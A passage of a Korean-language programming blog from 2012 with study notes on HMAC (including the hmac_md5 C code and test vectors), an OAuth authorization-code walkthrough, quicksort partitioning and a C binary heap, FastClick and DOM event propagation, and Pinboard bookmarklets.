+<li>message sender 에 대한 authenticity 를 동시에 검증할 수 있다.</li>
+<li>핵심은 shared secret key 가 있다는 것</li>
+</ul>
+
+
+<p>MD5 나 SHA1 등의 cryptographic hash function 을 사용할 수 있다.
+HMAC-MD5 또는 HMAC-SHA1 등의 함수를 조합해낼 수 있다.</p>
+
+<p>HMAC-SHA1 알고리즘의 콤포넌트들을 설명하면,</p>
+
+<p>key 가 64 bytes (== 512 bits) 보다 크면 SHA1 을 돌려서 digest 해서 줄인다.</p>
+
+<p>SHA1 digest size 는 160 bit 니까, 이제 key size 는 무조건 64 bytes 보다 작다.</p>
+
+<p>그 다음에 뒤를 0 으로 패딩한다.</p>
+
+<p>그 다음에 이 (패딩된) key 를 가지고 inner pad, outer pad 를 만든다.</p>
+
+<ul>
+<li>inner pad = 64 bytes 각각의 byte 와 0x36 간에 XOR.</li>
+<li>outer pad = 64 bytes 각각의 byte 와 0x5c 간에 XOR.</li>
+</ul>
+
+
+<p>이제 inner pad + message 를 붙여서, SHA1 을 돌리고 나온 digest 를 가지고.</p>
+
+<p>outer pad + digest 를 붙여서 또 SHA1 을 돌린다.</p>
+
+<p>그럼 나온 최종 digest 160 bits. 이게 HMAC-SHA1 의 결과값이다.</p>
+
+<p>Dr. Dobb&rsquo;s Journal 에 나온 hmac_md5()</p>
+
+<pre><code>/* Function: hmac_md5 */
+void
+hmac_md5(text, text_len, key, key_len, digest)
+unsigned char* text; /* pointer to data stream */
+int text_len; /* length of data stream */
+unsigned char* key; /* pointer to authentication key */
+int key_len; /* length of authentication key */
+caddr_t digest; /* caller digest to be filled in */
+{
+     MD5_CTX context;
+     unsigned char k_ipad[65]; /* inner padding - key XORd with ipad */
+     unsigned char k_opad[65]; /* outer padding - key XORd with opad */
+     unsigned char tk[16];
+     int i;
+     /* if key is longer than 64 bytes reset it to key=MD5(key) */
+     if (key_len &gt; 64) {
+         MD5_CTX      tctx;
+         MD5Init(&amp;tctx);
+         MD5Update(&amp;tctx, key, key_len);
+         MD5Final(tk, &amp;tctx);
+
+         key = tk;
+         key_len = 16;
+     }
+     /* the HMAC_MD5 transform looks like:
+      * MD5(K XOR opad, MD5(K XOR ipad, text))
+      * where K is an n byte key
+      * ipad is the byte 0x36 repeated 64 times
+      * opad is the byte 0x5c repeated 64 times
+      * and text is the data being protected
+      */
+     /* start out by storing key in pads */
+     bzero( k_ipad, sizeof k_ipad);
+     bzero( k_opad, sizeof k_opad);
+     bcopy( key, k_ipad, key_len);
+     bcopy( key, k_opad, key_len);
+
+     /* XOR key with ipad and opad values */
+     for (i=0; i&lt;64; i++) {
+             k_ipad[i] ^= 0x36;
+             k_opad[i] ^= 0x5c;
+     }
+     /* perform inner MD5 */
+     MD5Init(&amp;context);               /* init context for 1st pass */
+     MD5Update(&amp;context, k_ipad, 64)      /* start with inner pad */
+     MD5Update(&amp;context, text, text_len); /* then text of datagram */
+     MD5Final(digest, &amp;context);          /* finish up 1st pass */
+     /* perform outer MD5 */
+     MD5Init(&amp;context);               /* init context for 2nd pass */
+     MD5Update(&amp;context, k_opad, 64); /* start with outer pad */
+     MD5Update(&amp;context, digest, 16); /* then results of 1st hash */
+     MD5Final(digest, &amp;context);      /* finish up 2nd pass */
+}
+
+key =         0x0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b
+key_len =     16 bytes
+data =        "Hi There"
+data_len =    8  bytes
+digest =      0x9294727a3638bb1c13f48ef8158bfc9d
+
+key =         "Jefe"
+data =        "what do ya want for nothing?"
+data_len =    28 bytes
+digest =      0x750c783e6ab0b503eaa86e310a5db738
+key =         0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+key_len       16 bytes
+data =        0xDDDDDDDDDDDDDDDDDDDD...
+              ..DDDDDDDDDDDDDDDDDDDD...
+              ..DDDDDDDDDDDDDDDDDDDD...
+              ..DDDDDDDDDDDDDDDDDDDD...
+              ..DDDDDDDDDDDDDDDDDDDD
+data_len =    50 bytes
+digest =      0x56be34521d144c88dbb8c733f0e8b3f6
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/12/14/simple-introduction-to-oauth/">Simple Introduction to OAuth</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-12-14T10:34:00+09:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>10:34 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>OAuth: user, client, and server</h3>
+
+<p><a href="http://hueniverse.com">Eran Hammer</a> 가 OAuth 2.0 을 떠난다고 한다. Web 이 아니라 Enterprise 의 요구에 끌려가면서 복잡해지고 거대해지고 등등의 사퇴의 변을 블로그에 올렸다.</p>
+
+<ul>
+<li><p><a href="http://hueniverse.com">Eran Hammer&rsquo;s blog</a> 에 OAuth 1.0 에 대한 좋은 글들이 많다.</p></li>
+<li><p>Heroku 에서 일하는 Schneems 의 <a href="http://schneems.com/post/23164666348/oauth-a-tale-of-two-servers">OAuth: A Tale of Two Servers</a> 를 읽고 정리해본다.</p></li>
+</ul>
+
+
+<p>우선 이 글에 나오는 Facebook 이나 instagram 은 이해를 돕기위한 예일뿐, 그들이 이런 프로토콜이나 flow 나 URL 을 사용한다는 것은 절대 아님.</p>
+
+<ul>
+<li>리소스를 보관하고 있는 서버 (i.e. Facebook 의 Social Graph)</li>
+<li>OAuth Client (i.e. Facebook 의 Social Graph 를 import 하려는 instagram 서버)</li>
+</ul>
+
+
+<p>우선 OAuth Client (i.e. instagram) 를 OAuth Provider (i.e. Facebook) 에
+등록해야한다.</p>
+
+<p>예를 들어 instagram 개발자는 Facebook 개발자 페이지에 가서</p>
+
+<pre><code>client_id=instagram
+</code></pre>
+
+<p>를 등록하고</p>
+
+<pre><code>client_secret=bar
+</code></pre>
+
+<p>를 발급받는다.</p>
+
+<p>실제 유저가 instagram 을 사용하는 경우를 상상해보자.</p>
+
+<p>instagram 에서</p>
+
+<pre><code>GET facebook.com/oauth/authorize? 
+client_id=instagram
+callback=instagram.com/oauth_accept
+</code></pre>
+
+<p>를 facebook.com 에 쏜다.</p>
+
+<p>facebook 은 이제 유저한테서 허가를 받아야겠다고 생각한다.</p>
+
+<p>facebook 은 instagram 이 유저 XXX 의 어카운트를 접근하려고 한다&hellip;
+허가해줄거냐 말거냐 물어보는 화면을 출력.</p>
+
+<p>유저가 YES 하면 facebook 은</p>
+
+<pre><code>GET instagram.com/oauth_accept?
+code=foobahz
+</code></pre>
+
+<p>를 쏜다. 유저의 허락을 받았기에 <code>code=foobahz</code> 를 쏴주는 것이다.</p>
+
+<p>이제 instagram 은 다음을 facebook.com 에 쏘고, access_token 을 받는다.
+3 가지 정보를 같이 보냄으로써 유저의 허락도 받았고, legitimate 한 instagram 프로그램이라는 것을 입증하는 것이다.</p>
+
+<pre><code>POST facebook.com/oauth/access_token
+code=foobahz
+client_id=instgram
+client_secret=bar
+
+Result:
+
+{ 'access_token': 'supersecret' }
+</code></pre>
+
+<p>이제 access_token 을 받았으니 사용자의 Social Graph 를 요청한다던가 하는 리퀘스트를 access_token 과 같이 보낼 수 있다. Facebook 은 이 access_token 이 authorized 된 것이고 자기가 발급해준 것이라는 것을 확인할 수 있기때문에, instagram 의 요청을 받아들인다.</p>
+
+<pre><code>GET facebook.com/user/me/friends
+access_token=supersecret
+</code></pre>
+
+<h3>OAuth Provider</h3>
+
+<ul>
+<li><a href="http://api.babo.com/oauth/request_token">http://api.babo.com/oauth/request_token</a></li>
+<li><a href="http://api.babo.com/oauth/authorize">http://api.babo.com/oauth/authorize</a></li>
+<li><a href="http://api.babo.com/oauth/access_token">http://api.babo.com/oauth/access_token</a></li>
+</ul>
+
+
+<p>Further readings:</p>
+
+<ul>
+<li><a href="http://pydanny.com/the-sorry-state-of-python-oauth-providers.html">The sorry state of Python OAuth providers</a></li>
+<li><a href="http://www.apigee.com">Apigee homepage</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/12/01/partition-function-in-quicksort/">Partition Function in Quicksort</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-12-01T21:18:00+09:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>9:18 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>Quicksort</h3>
+
+<p>Pseudo-code 로 Quicksort 를 기술해보자.</p>
+
+<pre><code>def qsort(a):
+    if len(a) &lt;= 1:
+        return a
+    pivot = a[0]
+    less = []
+    greater = []
+
+    for i in range(1,len(a)):
+        if a[i] &lt; pivot:
+            less.append(a[i])
+        else
+            greater.append(a[i])
+
+    return qsort(less) + [ pivot ] + qsort(greater)
+</code></pre>
+
+<p>Python 으로 구현하니까 너무 간단한데, C 나 Java 로 구현할때는 메모리에 신경을 써야 한다.
+별도의 메모리를 쓰지 않으면서, less / greater 로 파티셔닝하는 함수를 구현하는 것이 좀 까다로운데&hellip;</p>
+
+<p>Sedgewick 의 알고리즘 책에 나온 파티셔닝 함수가 있다. 근데 이 함수에 골때린 점이 있다.
+__Pivot 과 같은 값들이 여러개 있을 경우, left list / right list 양쪽으로 다 갈 수 있다는 점.
+다만 recursion 을 거듭하면서, 양쪽에 흩어져 있는 (Pivot 과) 동일 값들이 pivot 쪽으로 모이게 되는 것이다.</p>
+
+<pre><code>int _partition(int a[],int lo,int hi) {
+    int pivot;
+    int i,j;
+    pivot = a[lo];
+    i = lo; j = hi+1;
+    while(1) {
+        while (a[++i] &lt; pivot) if (i &gt;= hi) break;
+        while (a[--j] &gt; pivot) if (j &lt;= lo) break;
+        if (i&gt;=j) break;
+        swap(&amp;a[i],&amp;a[j]);
+    }
+    swap(&amp;a[lo],&amp;a[j]);
+    return j;
+}
+</code></pre>
+
+<p>좀 더 직관적인 파티션 함수</p>
+
+<pre><code>int __partition(int a[],int lo,int hi) {
+    int pivot;
+    int i,j;
+    pivot = a[lo];
+    i=j=lo;
+    for (++j;j&lt;=hi;j++) {
+        if (a[j] &lt; pivot) {
+            i++;
+            swap(a,i,j);
+        }
+    }
+    swap(a,lo,i);
+    return i;
+}
+void __q(int a[],int lo,int hi) {
+    int j;
+    if (hi-lo&lt;=0) return;
+    j = __partition(a,lo,hi);
+    __q(a,lo,j-1);
+    __q(a,j+1,hi);
+}
+</code></pre>
+
+<h3>Counting inversions by piggybacking mergesort</h3>
+
+<p>곁다리로, Mergesort 의 응용으로 재미난 것이 있는데.
+Sort 가 되지 않은 pair 의 갯수를 찾아내는 알고리즘.
+즉 inversion pair 를 찾는 알고리즘.
+Mergesort 를 piggybacking 해서 카운팅함.</p>
+
+<p>사람들이 1 부터 n 까지 랭킹을 매긴다고 했을때,
+Person A 와 Person B 가 각각 매긴 랭킹이 얼마나 유사한가를 측정하는 알고리즘도 응용해서 만들 수 있음.</p>
+
+<p>Recommendation 에서 쓰이는 collaborative filtering.</p>
+
+<h3>Binary Heap</h3>
+
+<p>Binary Heap 으로 Minimum priority queue 를 구현해보았다.</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+typedef struct _heap {
+    int heap[1024];
+    int N;
+} heap;
+
+/* heap index starts from 1 */
+int parent(int idx) { return idx/2; }
+int left(heap * p_heap, int idx) { return idx*2 &lt;= p_heap-&gt;N ? idx*2 : 0; }
+int right(heap * p_heap, int idx) { return idx*2+1 &lt;= p_heap-&gt;N ? idx*2+1 : 0; }
+swap(int a[],int i,int j) { int t = a[i]; a[i] = a[j]; a[j] = t; }
+bubble_up(heap * p_heap) {
+    int i = p_heap-&gt;N;
+
+    while (i &gt; 0 &amp;&amp; parent(i) &gt; 0) {
+        if (p_heap-&gt;heap[i] &lt; p_heap-&gt;heap[ parent(i) ] ) {
+            swap(p_heap-&gt;heap, i, parent(i));
+            i = parent(i);
+        } else
+            break;
+    }
+}
+sink(heap * p_heap) {
+    int i = 1;
+    int l,r;
+    int * a = p_heap-&gt;heap;
+
+    while (i &lt; p_heap-&gt;N) {
+        l = left(p_heap, i);
+        r = right(p_heap, i);
+        if (a[i] &gt; a[l]) {
+            if (a[l] &gt; a[r]) {
+                swap(a, i, r);
+                i = r;
+            } else {
+                swap(a, i, l);
+                i = l;
+            }
+        } else if (a[i] &gt; a[r]) {
+            if (a[r] &gt; a[l]) {
+                swap(a, i, l);
+                i = l;
+            } else {
+                swap(a, i, r);
+                i = r;
+            }
+        } else
+            break;
+    }
+}
+heap_init(heap * p_heap) {
+    p_heap-&gt;N = 0;
+    p_heap-&gt;heap[0] = (0xFFFFFFFF &lt;&lt; 1 &gt;&gt; 1);
+}
+heap_add(heap * p_heap, int x) {
+    p_heap-&gt;heap[ ++p_heap-&gt;N ] = x;
+    bubble_up(p_heap);
+}
+int heap_remove(heap * p_heap) {
+    int min = p_heap-&gt;heap[1];
+    int end = p_heap-&gt;heap[ p_heap-&gt;N ];
+    p_heap-&gt;heap[1] = end;
+    p_heap-&gt;N--;
+    sink(p_heap);
+
+    return min;
+}
+heap_isempty(heap * p_heap) { return p_heap-&gt;N == 0; }
+heap_heapify(heap * p_heap, int a[], int N) {
+    int i;
+    heap_init(p_heap);
+    for (i = 0;i &lt; N;i++)
+        heap_add(p_heap, a[i]);
+}
+void _d(int a[],int N) {
+    int i;
+    for (i=0;i&lt;N;i++) printf("%d ", a[i]);
+    printf("\n");
+}
+main()
+{
+    int a[]={ 123, 1, 0, -4, 45, 38, 24, 99, 88, 43, 23, 12, 9, 8, 7, 46, 77 };
+    int N = sizeof a / sizeof(int);
+    heap h;
+
+    _d(a,N);
+    heap_heapify(&amp;h, a, N);
+    while (!heap_isempty(&amp;h)) printf("%d ", heap_remove(&amp;h));
+    printf("\n");
+}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/10/18/300ms-delay/">300ms Delay</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-10-18T23:05:00+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>11:05 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>UIWebView 에서 onclick event 를 잡을때, 터치 후 event 발사까지 300ms 정도의 딜레이가 있다.
+래깅이 느껴지고, 손가락이 오그라든다.</p>
+
+<p>그 딜레이를 없애고 최대한 반응 속도를 올리기 위한 방법이 있다.</p>
+
+<p>아래의 아티클들에 소개되어 있는데,</p>
+
+<ul>
+<li><a href="http://labs.ft.com/articles/ft-fastclick">FT Fastclick</a></li>
+<li><a href="http://labs.ft.com/2011/08/fastclick-native-like-tapping-for-touch-apps/">FastClick: native-like tapping for touch apps</a></li>
+<li><a href="http://labs.ft.com/2012/08/fastclick-redux/">FastClick redux</a></li>
+<li><a href="http://github.com/ftlabs/fastclick">ftlabs/fastclick</a></li>
+<li><a href="http://github.com/dave1010/jquery-fast-click">dave1010/jquery-fast-click</a></li>
+</ul>
+
+
+<p>번역 &amp; 정리해본다.</p>
+
+<p>모바일 브라우저에서 다음과 같은 페이지를 로드했을 경우</p>
+
+<pre><code>&lt;button onclick='signup()'&gt;Sign Up!&lt;/button&gt;
+</code></pre>
+
+<p>유저가 button 을 누르고, 브라우저가 click event 를 쏘기까지 약 300ms 의 딜레이가 있다.
+모바일 브라우저가 이런 딜레이를 두는 이유는 더블탭을 감지하기 위해서이다.
+이 딜레이를 없앨 수 없을까?</p>
+
+<p>FT Labs 에서 제작한 FT FastClick 에서 쓴 방식은 TouchEnd event 가 잡혔을때, click event 를 쏴주는 식이다.</p>
+
+<p>고려해야 할 상황은 (<a href="http://code.google.com/mobile/articles/fast_buttons.html">Creating Fast Button for Mobile Web Applications</a>)</p>
+
+<ol>
+<li>딴데를 터치한 다음에 버튼 위로 손을 끌고 와서 놔버려서 button 에 touchend 가 뜬 경우 -> click event 를 쏘면 안됨.</li>
+<li>버튼을 터치하고 화면을 드래그한다음에 손을 놔버려서 button 에 touchend 가 뜬 경우 -> 버튼을 누를 의도였다기보다는 화면을 스크롤하고 싶었던 것. 그래서 click event 를 쏘면 안됨.</li>
+</ol>
+
+
+<h3>FT Fastclick</h3>
+
+<p><a href="http://github.com/ftlabs/fastclick">ftlabs/fastclick</a> 의 사용법은.</p>
+
+<pre><code>&lt;script type='application/javascript' src='/path/to/fastclick.js'&gt;&lt;/script&gt;
+
+window.addEventListener('load'), function() {
+  new FastClick(document.body);
+}, false);
+</code></pre>
+
+<p>으로 간단하다. 사용해보니 잘 동작한다. UIWebView 에서 터치가 native app 처럼 빠르게 인식된다. 하지만 여기에 만족할 수 없었다. 소스를 디벼야 직성이 풀릴 듯 했다.</p>
+
+<p>그래서 <a href="http://labs.ft.com/wp-content/uploads/2011/08/fastclick.js">FastClick() 소스</a> 를 디비기 시작했다.</p>
+
+<pre><code>// Determine whether touch handling is supported
+var touchSupport = 'ontouchstart' in window;
+</code></pre>
+
+<p><em>ontouchstart</em> 가 있으면 touch 를 지원하는 디바이스로 판단.</p>
+
+<pre><code>// Set up event handlers as required
+if (touchSupport) {
+  layer.addEventListener('touchstart', onTouchStart, true);
+  layer.addEventListener('touchmove', onTouchMove, true);
+  layer.addEventListener('touchend', onTouchEnd, true);
+  layer.addEventListener('touchcancel', onTouchCancel, true);
+}
+layer.addEventListener('click', onClick, true);
+</code></pre>
+
+<p>addEventListener() 를 통해서 touchstart / touchmove / touchend / touchcancel 에 listener 를 등록한다.</p>
+
+<p>addEventListener() 의 문법은</p>
+
+<pre><code>target.addEventListener(type, listener[, useCapture]);
+</code></pre>
+
+<p>여기서 <em>useCapture</em> 는 무얼까?</p>
+
+<blockquote><p>If true, useCapture indicates that the user wishes to initiate capture. After initiating capture, all events of the specified type will be dispatched to the registered listener before being dispatched to any EventTarget beneath it in the DOM tree. Events which are bubbling upward through the tree will not trigger a listener designated to use capture.</p></blockquote>
+
+<p>capture phase 는 <em>DefaultView</em> -> <em>Document</em> -> <em><html></em> -> &hellip; 해서 <em>target</em> 까지 내려오는 구간. bubbling phase 는 <em>target</em> 에서 다시 위로 올라가는 구간인데,
+<em>useCapture</em> 를 쓰면, <em>the capture and target phases</em> 에만 event listener 를 붙이는 것이다. 그리고, 하나의 타겟에 여러개의 event listener 들이 붙을 수 있음.</p>
+
+<p>실험을 해보자.  useCapture 를 <em>true</em> 로 세팅하면, DOM tree 의 child node 한테 가는 이벤트를 먼저 잡는 것을 볼 수 있다.</p>
+
+<p>Parent node 에 listener 를 붙이고, <em>useCapture = true</em> 로 listener 를 붙이고,
+child node 에는 <em>useCapture = false</em> 로 listener 를 붙인다.
+그리고, parent 쪽 listener 에서는 stopPropagation() 으로 propagation 을 끊는다.
+<em>two</em> 를 클릭해도, parent node 에 붙은 listener 가 control 을 가져가며,
+event propagation 을 stop 해버리므로 <em>two</em> 에 붙은 listner 는 수행될 기회를 가지지 못한다. 그래서 <em>three</em> 가 아닌 <em>four</em> 로 변해버린다.</p>
+
+<p>jsfiddle 에서 실험해보자.</p>
+
+<iframe style="width: 100%; height: 300px" src="http://jsfiddle.net/zomojj/mtd8d/1/embedded/" allowfullscreen="allowfullscreen" frameborder="0"></iframe>
+
+
+<p>아무리 클릭해도 <em>three</em> 는 나오지 않고 <em>four</em> 만 나온다. <em>useCapture</em> 의 effect 를 알 수 있다.</p>
+
+<p>FT FastClick 코드로 다시 돌아가면, touchstart, touchend, touchmove, touchcancel 에 listener 를 붙이고, click 에도 listener 를 붙인다.
+그리고 이미 onclick 핸들러가 있었다면, listener 로 전환시켜서 나중에 불리도록 조치한다. 기존의 onclick 핸들러는 리셋.</p>
+
+<pre><code>// If a handler is already declared in the element's onclick attribute, it will be fired before
+// FastClick's onClick handler. Fix this by pulling out the user-defined handler function and
+// adding it as listener.
+if (layer.onclick instanceof Function) {
+  layer.addEventListener('click', layer.onclick, false);
+  layer.onclick = '';
+}
+</code></pre>
+
+<h3>Event Canceling</h3>
+
+<p>DOM event 를 cancel 하는데, 3 가지 method 가 있는데,</p>
+
+<ul>
+<li>preventDefault()</li>
+<li>stopPropagation()</li>
+<li>stopImmediatePropagation()</li>
+</ul>
+
+
+<p>우선 preventDefault() 부터 보면,</p>
+
+<blockquote><p>preventDefault()</p>
+
+<p>If an event is cancelable, the preventDefault method is used to signify that the event is to be canceled, meaning any default action normally taken by the implementation as a result of the event will not occur. If, during any stage of event flow, the preventDefault method is called the event is canceled. Any default action associated with the event will not occur. Calling this method for a non-cancelable event has no effect. Once preventDefault has been called it will remain in effect throughout the remainder of the event&rsquo;s propagation. This method may be used during any stage of event flow.</p></blockquote>
+
+<p>예제를 해봤다. <em>checkbox 에 클릭을 해도 check 가 되지 않는다!</em></p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;DOM Event Example&lt;/title&gt; 
+&lt;script&gt;
+// Function to change the content of t2
+function stopDefAction(evt) {
+    evt.preventDefault();
+}  
+// Function to add event listener to t
+function load() { 
+  document.getElementById('my-checkbox').addEventListener(
+    'click', stopDefAction, false
+  );
+} 
+
+document.addEventListener("DOMContentLoaded", load, false);
+&lt;/script&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;p&gt;Please click on the checkbox control.&lt;/p&gt;
+
+&lt;form&gt;
+    &lt;input type="checkbox" id="my-checkbox" /&gt;
+    &lt;label for="my-checkbox"&gt;Checkbox&lt;/label&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>HTML 섹션을 클릭해서 보도록.</p>
+
+<iframe style="width: 100%; height: 300px" src="http://jsfiddle.net/zomojj/b2BPD/3/embedded/" allowfullscreen="allowfullscreen" frameborder="0"></iframe>
+
+
+<p>그럼 다음은 stopPropagation().</p>
+
+<blockquote><p>stopPropagation()</p>
+
+<p>Prevents all other event listeners from being triggered, excluding any remaining candiate event listeners. Once it has been called, further calls to this method have no additional effect.</p></blockquote>
+
+<p>그럼 preventDefault() 와 stopPropagation() 의 차이는 무엇일까 궁금해졌다.</p>
+
+<p>간단히 정리하면, preventDefault() 는 event 에 대한 default functionality 가 일어나는 것을 막는다. 하지만 event 는 propagate 된다.</p>
+
+<p>반대로 stopPropagation() 은 default functionality 는 일어나지만, parent 로 propagate 되지는 않는다.</p>
+
+<blockquote><p><a href="http://stackoverflow.com/questions/5963669/whats-the-difference-between-event-stoppropagation-and-event-preventdefault">What&rsquo;s the difference between event.stopPropagation and event.preventDefault?</a></p>
+
+<p>stopPropagation stops the event from bubbling up the event chain.</p>
+
+<p>preventDefault prevents the default action the browser makes on that event.</p></blockquote>
+
+<pre><code> &lt;!DOCTYPE html&gt;
+ &lt;html&gt;
+ &lt;head&gt;
+ &lt;script type="application/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.8.2/jquery.min.js"&gt;&lt;/script&gt;
+ &lt;title&gt;DOM Event Example&lt;/title&gt;  
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;div id="foo"&gt;
+   &lt;button id="but" /&gt;
+ &lt;/div&gt;   
+ &lt;script&gt;
+ $("#foo").click( function () { 
+   console.log("#foo click")
+ });
+
+ $("#but").click( function (ev) {
+   console.log("#but click");
+   ev.stopPropagation(); 
+ })
+ &lt;/script&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
+</code></pre>
+
+<p>위의 예제에서 보면, <code>ev.stopPropagation()</code> 을 하면 console 에</p>
+
+<pre><code> #but click 
+</code></pre>
+
+<p>만 나온다.</p>
+
+<p>하지만 <code>//ev.stopPropagation()</code> 로 comment-out 하면 console 에</p>
+
+<pre><code> #but click
+ #foo click
+</code></pre>
+
+<p>이라고 나온다. parent node 로 event 가 propagate 된 것이다.</p>
+
+<p>그럼 stopPropagation() 과 stopImmediatePropagation() 의 차이는 무엇일까?</p>
+
+<p><a href="http://stackoverflow.com/questions/5299740/jquery-stoppropagation-vs-stopimmediatepropagation">jquery: stopPropagation vs stopImmediatePropagation</a> 에 설명이 되어 있다.</p>
+
+<p>우선 <a href="http://jsfiddle.net/syT6K/">jsfiddle 예제</a> 를 보자.</p>
+
+<h3>Exceptions thrown inside event listener</h3>
+
+<blockquote><p>Exceptions thrown inside event listeners must not stop the propagation of the event or affect the propagation path. The exception itself must not propogate outside the scope of the event handler.</p></blockquote>
+
+<pre><code>var e = document.createEvent("Event");
+e.initEvent("myevent", false, false);
+var target = document.createElement("div");
+target.addEventListener("myevent", function () {
+   throw "Error";
+});
+target.dispatchEvent(e); // Causes the event listener to throw an exception...
+// The previously thrown exception doesn't affect the code that follows:
+console.log("Exceptions? No problem");
+</code></pre>
+
+<p>실행해보면 &ldquo;Exceptions? No problem&rdquo; 이 출력된다. event listener 에서 던진 &ldquo;Error&rdquo; 가 parent scope 로 올라오지 않는다는 이야기.</p>
+
+<h3>Further works:</h3>
+
+<ol>
+<li>DOM Level 2 Events Spec 과 DOM Level 3 Events Spec 를 정독해봐야겠다.</li>
+<li>DOM Event Flow 와 addEventListener(), preventDefault(), stopPropagation(), stopImmediatePropagation() 부분을 정독해야겠다.</li>
+<li>Touch event 를 tracking 해서 drawing 을 하는 예제를 만들어 iPad 로 테스트해봐야겠다.</li>
+<li>FastClick.js 의 line-by-line 분석.</li>
+</ol>
+
+
+<h3>Further readings:</h3>
+
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener">MDN: element.addEventListener</a></li>
+<li><a href="http://www.w3.org/TR/DOM-Level-3-Events/#event-flow">Event dispatch and DOM event flow</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/DOM/Touch_events#Example">Touch event example</a></li>
+<li><a href="http://davidwalsh.name/javascript-events">David Walsh&rsquo;s blog</a></li>
+<li><a href="http://blog.bittersweetryan.com/2012/07/playing-around-with-javascripts.html">Playing Around With JavaScript&rsquo;s stopPropagation and preventDefault Methods </a></li>
+<li><a href="http://dev-tricks.com/event-preventdefault-and-event-stoppropagation-and-event-stopimmediatepropagation/">Quick Tips:event.preventDefault() and event.stopPropagation and event.stopImmediatePropagation</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/10/18/pinboard-bookmarklets/">Pinboard Bookmarklets</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-10-18T14:45:00+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>2:45 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://naveenium.com">hi. i&rsquo;m naveen.</a> 에서 필요한 bookmarklets 를 발견했다.</p>
+
+<p>위 blog 에는 del.icio.us 버전이 적혀있는데</p>
+
+<p><code>javascript:(function(){l=location.href;t=document.title;if(!t) t = prompt('title:');tags=prompt('tags:');location.href='https://api.del.icio.us/v1/posts/add?url='+escape(l)+'&amp;description='+escape(t)+'&amp;tags='+escape(tags);})()</code></p>
+
+<p>Pinboard 의 경우 delicious API 를 그대로 지원하므로, 아래와 같이
+<a href="https://api.del.icio.us/v1">https://api.del.icio.us/v1</a> 대신에 <a href="https://api.pinboard.in/v1/">https://api.pinboard.in/v1/</a> 사용.</p>
+
+<p><code>javascript:(function(){l=location.href;t=document.title;if(!t) t = prompt('title:');tags=prompt('tags:');location.href='https://api.pinboard.in/v1/posts/add?url='+escape(l)+'&amp;description='+escape(t)+'&amp;tags='+escape(tags);})()</code></p>
+
+<p>크롬을 쓰기 때문에 핫키를 지정하기가 까다로운데, <em>기타 검색엔진</em> 에 등록하기로 했다. CMD-, 를 누르면 설정 페이지가 나오는데, 검색 -> 검색엔진 관리&hellip; 에서 &ldquo;da / da / 그리고 위의 자바스크립코드&rdquo; 를 입력하면 된다.</p>
+
+<p>그 이후에,
+CMD-L 을 누르고 da 라고 치면 tag 를 묻는 prompt 가 뜨고, 바로 pinboard 에 북마크가 추가된다.</p>
+
+<p>P.S. Bookmarklets 가 Pinterest 처럼 여기저기서 이미지나 자료를 모아 큐레이션 하는 사이트에 잘 어울리는 기법인 것 같다.</p>
+
+<h3>Further works:</h3>
+
+<ul>
+<li>Pinterest 의 <em>Pin it</em> bookmarklets 의 코드도 한번 봐야겠다.</li>
+<li><a href="http://www.hongkiat.com/blog/100-useful-bookmarklets-for-better-productivity-ultimate-list/">100 useful bookmarklets for better productivity</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/10/18/restful-json-in-rails/">RESTful JSON in Rails</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-10-18T10:10:00+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>10:10 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="http://blog.gomiso.com/2011/06/27/building-a-platform-api-on-rails">Building a platform API on rails</a></li>
